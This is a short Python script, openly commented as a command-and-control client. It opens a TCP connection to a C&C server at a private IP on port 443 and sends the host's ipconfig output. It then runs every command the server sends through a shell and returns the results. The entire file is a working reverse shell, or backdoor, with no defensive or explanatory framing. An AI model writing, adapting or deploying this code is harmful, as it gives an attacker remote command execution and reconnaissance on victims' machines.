import socket
import subprocess

# IP and port of the C&C server
CCIP = "192.168.8.107"  # Replace with the server's IP address
CCPORT = 443            # Port number to connect to

# Function to establish a connection to the server
def connect(ip, port):
    try:
        # Create a TCP socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server
        client.connect((ip, port))
        return client
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

# Function to execute a command received from the server
def cmd(client, data):
    try:
        # Run the command using subprocess
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # Capture both stdout and stderr
        output = proc.stdout.read() + proc.stderr.read()
        # Send the output back to the server
        client.send(output + b"\n")
    except Exception as e:
        # Send error message if command execution fails
        client.send(f"Error executing command: {e}\n".encode())

# Function to send initial system info (IP configuration) to the server
def send_ipconfig(client):
    try:
        # Run 'ipconfig' command
        proc = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        # Send the output to the server
        client.send(output + b"\n")
    except Exception as e:
        client.send(f"Error running ipconfig: {e}\n".encode())

# Function to handle the command loop
def cli(client):
    while True:
        try:
            # Receive command from server
            data = client.recv(1024)
            if not data:
                break  # If no data, server disconnected
            data = data.decode().strip()
            if data.lower() == "exit":
                break  # Exit command received
            # Execute the command
            cmd(client, data)
        except:
            break  # Break on any error
    client.close()  # Close the connection

# Main function to initiate connection and start communication
def main():
    client = connect(CCIP, CCPORT)
    if client:
        send_ipconfig(client)  # Send initial system info
        cli(client)            # Start command loop
    else:
        print("Unable to connect to C&C server.")

# Entry point of the script
if __name__ == "__main__":
    main()
